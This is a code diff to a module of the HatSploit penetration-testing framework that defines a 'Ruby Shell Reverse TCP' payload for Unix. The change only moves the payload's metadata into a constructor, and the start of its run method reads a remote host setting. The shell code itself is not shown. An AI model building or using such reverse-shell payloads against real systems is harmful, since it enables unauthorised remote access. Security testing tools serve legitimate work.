@@ -7,18 +7,21 @@ from hatsploit.lib.payload import Payload
 
 
 class HatSploitPayload(Payload):
-    details = {
-        'Name': "Ruby Shell Reverse TCP",
-        'Payload': "unix/generic/ruby_reverse_tcp",
-        'Authors': [
-            'Ivan Nikolsky (enty8080) - payload developer',
-        ],
-        'Description': "Ruby shell reverse TCP payload.",
-        'Architecture': "generic",
-        'Platform': "unix",
-        'Rank': "high",
-        'Type': "reverse_tcp",
-    }
+    def __init__(self):
+        super().__init__()
+
+        self.details = {
+            'Name': "Ruby Shell Reverse TCP",
+            'Payload': "unix/generic/ruby_reverse_tcp",
+            'Authors': [
+                'Ivan Nikolsky (enty8080) - payload developer',
+            ],
+            'Description': "Ruby shell reverse TCP payload.",
+            'Architecture': "generic",
+            'Platform': "unix",
+            'Rank': "high",
+            'Type': "reverse_tcp",
+        }
 
     def run(self):
         remote_host = self.handler['RHOST']
